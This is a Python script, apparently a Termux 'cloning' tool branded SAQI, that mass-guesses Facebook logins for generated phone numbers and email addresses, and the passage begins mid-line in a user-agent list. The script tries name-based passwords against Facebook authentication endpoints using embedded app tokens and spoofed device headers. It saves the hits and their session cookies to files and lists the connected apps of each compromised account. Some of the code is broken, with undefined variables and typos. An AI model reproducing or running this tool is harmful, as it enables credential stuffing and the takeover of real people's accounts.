Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/361.0.0.7.107;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/318.0.0.16.105;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;']

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
          X
{P}:  ███████╗██████╗ 
{S}:  ██╔════╝██╔══██╗
{G}:  ███████╗██████╔╝
{Y}:  ╚════██║██╔══██╗
{R}:  ███████ ██║  ██║
{R}:  ╚══════╝╚═╝  ╚═╝
{P}       \033[1;97m ONE MAN ARMY URF SAQI😎 \033[1;97m
\033[1;93m===============s=================
\033[1;97m Owner         : SAQIxRAHUL
\033[1;97m Whatsapp      : 03182155629
\033[1;97m GitHub        : One-manarmy
\033[1;97m Version       :\033[1;92m 2.3 \033[1;97m
\033[1;97m Status        : Free
\033[1;97m Notice        :\033[1;97m Use 10009/100089\033[1;97m
For More OK Ids
\033[1;93m===============R=================
'''####@-----Menu-----@####
def SxR_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2': 
        pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 #https://chat.whatsapp.com/Js1oU99b67uGRsaKs88RB7')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.SAQI'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        SxR_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' SxR-code=SAQI-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','SxR-182^)Code=SAQI-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .SAQI')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.SAQI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.SAQI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.SAQI', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36;]

"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/SAQI-OK.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mSxR-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {'authority': 'mbasic.facebook.com',
     'import': 'get',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Davik/2.1.0 (linex; U; Android 11.0.0; Samsung Galaxy S10 Build/46693ab8-f3f0-4713-9d99-a7ed13bc37fc [FBAN/FB4A;FBAV/555.0.0.123;FBBV/123456789;FBDM/{density=2.0,width=720,height=1280};FBLC/es_CU;FBRV/123456789;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S10;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = requests.get('https://free.facebook.com/', cookies=cookies, headers=headers)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SAQI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mSxR-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI":str(random.randint(20000, 40000)),"X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"1282901019105773|7kCl7leqcD-XrRu2wHd1QQTQCOc","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post(' https://b-api.facebook.com/method/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/SAQI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/SAQI-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mSxR-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SAQI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/SAQI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




SxR_Main()
